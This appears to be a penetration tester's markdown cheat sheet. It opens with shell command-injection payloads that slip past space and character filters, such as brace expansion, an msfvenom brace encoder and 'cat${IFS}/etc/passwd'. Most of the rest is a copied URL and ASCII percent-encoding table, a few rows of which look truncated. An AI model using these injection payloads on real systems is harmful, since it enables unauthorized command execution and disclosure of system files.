## shell brace expansion filter bypass
```
echo "which -a curl" | echo "{$(tr -s " " ,)}"
echo "which -a curl" | ./msfvenom -p - -a cmd --platform unix -b " " -e cmd/brace
```
the response will be: {which,-a,curl}

this should bypass some restrictions

### alternate examples space filter evasion/bypass:
```
echo a.|{which,-a,curl}
echo |{which,-a,curl};#.a
cat${IFS}/etc/passwd
```


# ASCII Encoding Reference

Your browser will encode input, according to the character-set used in your page.


https://www.w3schools.com/tags/ref_urlencode.asp

```
The default character-set in HTML5 is UTF-8.
Character 	From Windows-1252 	From UTF-8
space 	%20 	%20
! 	%21 	%21
" 	%22 	%22
# 	%23 	%23
$ 	%24 	%24
% 	%25 	%25
& 	%26 	%26
' 	%27 	%27
( 	%28 	%28
) 	%29 	%29
* 	%2A 	%2A
+ 	%2B 	%2B
, 	%2C 	%2C
- 	%2D 	%2D
. 	%2E 	%2E
/ 	%2F 	%2F
0 	%30 	%30
1 	%31 	%31
2 	%32 	%32
3 	%33 	%33
4 	%34 	%34
5 	%35 	%35
6 	%36 	%36
7 	%37 	%37
8 	%38 	%38
9 	%39 	%39
: 	%3A 	%3A
; 	%3B 	%3B
< 	%3C 	%3C
= 	%3D 	%3D
> 	%3E 	%3E
? 	%3F 	%3F
@ 	%40 	%40
A 	%41 	%41
B 	%42 	%42
C 	%43 	%43
D 	%44 	%44
E 	%45 	%45
F 	%46 	%46
G 	%47 	%47
H 	%48 	%48
I 	%49 	%49
J 	%4A 	%4A
K 	%4B 	%4B
L 	%4C 	%4C
M 	%4D 	%4D
N 	%4E 	%4E
O 	%4F 	%4F
P 	%50 	%50
Q 	%51 	%51
R 	%52 	%52
S 	%53 	%53
T 	%54 	%54
U 	%55 	%55
V 	%56 	%56
W 	%57 	%57
X 	%58 	%58
Y 	%59 	%59
Z 	%5A 	%5A
[ 	%5B 	%5B
\ 	%5C 	%5C
] 	%5D 	%5D
^ 	%5E 	%5E
_ 	%5F 	%5F
` 	%60 	%60
a 	%61 	%61
b 	%62 	%62
c 	%63 	%63
d 	%64 	%64
e 	%65 	%65
f 	%66 	%66
g 	%67 	%67
h 	%68 	%68
i 	%69 	%69
j 	%6A 	%6A
k 	%6B 	%6B
l 	%6C 	%6C
m 	%6D 	%6D
n 	%6E 	%6E
o 	%6F 	%6F
p 	%70 	%70
q 	%71 	%71
r 	%72 	%72
s 	%73 	%73
t 	%74 	%74
u 	%75 	%75
v 	%76 	%76
w 	%77 	%77
x 	%78 	%78
y 	%79 	%79
z 	%7A 	%7A
{ 	%7B 	%7B
| 	%7C 	%7C
} 	%7D 	%7D
~ 	%7E 	%7E
  	%7F 	%7F
` 	%80 	%E2%82%AC
 	%81 	%81
‚ 	%82 	%E2%80%9A
ƒ 	%83 	%C6%92
„ 	%84 	%E2%80%9E
… 	%85 	%E2%80%A6
† 	%86 	%E2%80%A0
‡ 	%87 	%E2%80%A1
ˆ 	%88 	%CB%86
‰ 	%89 	%E2%80%B0
Š 	%8A 	%C5%A0
‹ 	%8B 	%E2%80%B9
Œ 	%8C 	%C5%92
 	%8D 	%C5%8D
Ž 	%8E 	%C5%BD
 	%8F 	%8F
 	%90 	%C2%90
‘ 	%91 	%E2%80%98
’ 	%92 	%E2%80%99
“ 	%93 	%E2%80%9C
” 	%94 	%E2%80%9D
• 	%95 	%E2%80%A2
– 	%96 	%E2%80%93
— 	%97 	%E2%80%94
˜ 	%98 	%CB%9C
™ 	%99 	%E2%84
š 	%9A 	%C5%A1
› 	%9B 	%E2%80
œ 	%9C 	%C5%93
 	%9D 	%9D
ž 	%9E 	%C5%BE
Ÿ 	%9F 	%C5%B8
  	%A0 	%C2%A0
¡ 	%A1 	%C2%A1
¢ 	%A2 	%C2%A2
£ 	%A3 	%C2%A3
¤ 	%A4 	%C2%A4
¥ 	%A5 	%C2%A5
¦ 	%A6 	%C2%A6
§ 	%A7 	%C2%A7
¨ 	%A8 	%C2%A8
© 	%A9 	%C2%A9
ª 	%AA 	%C2%AA
« 	%AB 	%C2%AB
¬ 	%AC 	%C2%AC
­ 	%AD 	%C2%AD
® 	%AE 	%C2%AE
¯ 	%AF 	%C2%AF
° 	%B0 	%C2%B0
± 	%B1 	%C2%B1
² 	%B2 	%C2%B2
³ 	%B3 	%C2%B3
´ 	%B4 	%C2%B4
µ 	%B5 	%C2%B5
¶ 	%B6 	%C2%B6
· 	%B7 	%C2%B7
¸ 	%B8 	%C2%B8
¹ 	%B9 	%C2%B9
º 	%BA 	%C2%BA
» 	%BB 	%C2%BB
¼ 	%BC 	%C2%BC
½ 	%BD 	%C2%BD
¾ 	%BE 	%C2%BE
¿ 	%BF 	%C2%BF
À 	%C0 	%C3%80
Á 	%C1 	%C3%81
Â 	%C2 	%C3%82
Ã 	%C3 	%C3%83
Ä 	%C4 	%C3%84
Å 	%C5 	%C3%85
Æ 	%C6 	%C3%86
Ç 	%C7 	%C3%87
È 	%C8 	%C3%88
É 	%C9 	%C3%89
Ê 	%CA 	%C3%8A
Ë 	%CB 	%C3%8B
Ì 	%CC 	%C3%8C
Í 	%CD 	%C3%8D
Î 	%CE 	%C3%8E
Ï 	%CF 	%C3%8F
Ð 	%D0 	%C3%90
Ñ 	%D1 	%C3%91
Ò 	%D2 	%C3%92
Ó 	%D3 	%C3%93
Ô 	%D4 	%C3%94
Õ 	%D5 	%C3%95
Ö 	%D6 	%C3%96
× 	%D7 	%C3%97
Ø 	%D8 	%C3%98
Ù 	%D9 	%C3%99
Ú 	%DA 	%C3%9A
Û 	%DB 	%C3%9B
Ü 	%DC 	%C3%9C
Ý 	%DD 	%C3%9D
Þ 	%DE 	%C3%9E
ß 	%DF 	%C3%9F
à 	%E0 	%C3%A0
á 	%E1 	%C3%A1
â 	%E2 	%C3%A2
ã 	%E3 	%C3%A3
ä 	%E4 	%C3%A4
å 	%E5 	%C3%A5
æ 	%E6 	%C3%A6
ç 	%E7 	%C3%A7
è 	%E8 	%C3%A8
é 	%E9 	%C3%A9
ê 	%EA 	%C3%AA
ë 	%EB 	%C3%AB
ì 	%EC 	%C3%AC
í 	%ED 	%C3%AD
î 	%EE 	%C3%AE
ï 	%EF 	%C3%AF
ð 	%F0 	%C3%B0
ñ 	%F1 	%C3%B1
ò 	%F2 	%C3%B2
ó 	%F3 	%C3%B3
ô 	%F4 	%C3%B4
õ 	%F5 	%C3%B5
ö 	%F6 	%C3%B6
÷ 	%F7 	%C3%B7
ø 	%F8 	%C3%B8
ù 	%F9 	%C3%B9
ú 	%FA 	%C3%BA
û 	%FB 	%C3%BB
ü 	%FC 	%C3%BC
ý 	%FD 	%C3%BD
þ 	%FE 	%C3%BE
ÿ 	%FF 	%C3%BF
```

# URL Encoding Reference

The ASCII control characters %00-%1F were originally designed to control hardware devices.

```
Control characters have nothing to do inside a URL.
ASCII Character 	Description 	URL-encoding
NUL 	null character 	%00
SOH 	start of header 	%01
STX 	start of text 	%02
ETX 	end of text 	%03
EOT 	end of transmission 	%04
ENQ 	enquiry 	%05
ACK 	acknowledge 	%06
BEL 	bell (ring) 	%07
BS 	backspace 	%08
HT 	horizontal tab 	%09
LF 	line feed 	%0A
VT 	vertical tab 	%0B
FF 	form feed 	%0C
CR 	carriage return 	%0D
SO 	shift out 	%0E
SI 	shift in 	%0F
DLE 	data link escape 	%10
DC1 	device control 1 	%11
DC2 	device control 2 	%12
DC3 	device control 3 	%13
DC4 	device control 4 	%14
NAK 	negative acknowledge 	%15
SYN 	synchronize 	%16
ETB 	end transmission block 	%17
CAN 	cancel 	%18
EM 	end of medium 	%19
SUB 	substitute 	%1A
ESC 	escape 	%1B
FS 	file separator 	%1C
GS 	group separator 	%1D
RS 	record separator 	%1E
US 	unit separator 	%1F
```
